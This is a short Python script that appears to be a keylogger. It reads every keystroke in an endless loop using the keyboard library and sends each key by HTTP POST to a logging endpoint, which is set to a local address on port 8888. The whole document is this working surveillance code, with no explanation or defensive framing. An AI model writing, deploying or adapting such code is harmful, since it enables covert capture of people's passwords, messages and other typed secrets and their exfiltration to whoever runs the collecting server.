# All logged keys sent
import keyboard
import requests

server_url = 'http://127.0.0.1:8888/log'

while True:
    try:
        keys = keyboard.read_event().name
        if keys == 'enter':
            keys = '\n'  # Convert 'Enter' data to '\n'
        requests.post(server_url, data={'keys': keys})
    except KeyboardInterrupt:
        break
